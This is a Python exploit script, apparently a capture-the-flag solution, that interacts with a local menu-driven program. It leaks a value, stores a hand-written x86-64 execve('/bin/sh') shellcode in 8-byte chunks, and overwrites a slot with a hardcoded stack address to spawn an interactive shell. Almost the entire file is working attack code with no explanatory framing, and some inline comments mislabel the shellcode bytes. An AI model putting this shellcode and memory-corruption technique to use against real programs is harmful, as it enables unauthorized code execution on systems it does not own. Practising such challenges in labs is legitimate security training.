import interact
import struct
import re

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.read()
p.sendline(b'hacker')
data2 = p.read()
p.sendline(b'9')
data3 = p.read()
p.sendline(b'eat')
data4 = p.read()
data5 = p.read()
data6 = p.read()
data7 = p.read()
data8 = p.read()
data9 = p.read()
data10 = p.read()
data11 = p.read()
data12 = p.read()
data13 = p.read()
data14 = p.read()

regular_hexa = re.search(r'([a-fA-F0-9]{16})', data14.decode()).group(1)


#Each cookie har is 8 bytes with 8 of size so max payload is 64.

payload = b'\x56' + b'\x90\x90\x90\x90\x90' + b'\xF6\x31' # xor esi,esi
payload += b'\xbf\x48'+ b'\x90' * 6 # push rsi + movabs rdi, x
payload += b'\x68\x73\x2f\x2f\x6e\x69\x62\x2f' # /bin/shell 
payload += b'\x90' * 3 + b'\x54' + b'\x90' * 3 + b'\x57'  # push rdi + push rsp
payload += b'\x58' + 5 * b'\x90' + b'\x3b\x6a' # pop rdi + push 0x3b
payload += b'\x90' * 7 + b'\x5f' #pop rax
payload += b'\x90' * 6 + b'\x05\x0f' #Syscall

print(len(payload))

hex_payload = payload.hex()
part1 = hex_payload[:16]
part2 = hex_payload[16:32]
part3 = hex_payload[32:48]
part4 = hex_payload[48:64]
part5 = hex_payload[64:80]
part6 = hex_payload[80:96]
part7 = hex_payload[96:114]


p.sendline(b'0')
p.sendline(b'store')
p.sendline("0x" + part1)

p.sendline(b'1')
p.sendline(b'store')
p.sendline("0x" + part2)

p.sendline(b'2')
p.sendline(b'store')
p.sendline("0x" + part3)

p.sendline(b'3')
p.sendline(b'store')
p.sendline("0x" + part4)

p.sendline(b'4')
p.sendline(b'store')
p.sendline("0x" + part5)

p.sendline(b'5')
p.sendline(b'store')
p.sendline("0x" + part6)

p.sendline(b'6')
p.sendline(b'store')
p.sendline("0x" + part7)

p.sendline(b'11')
p.sendline(b'store')
p.sendline("0x7fffffffece0")

p.sendline(b'-1')
p.sendline(regular_hexa)

p.interactive()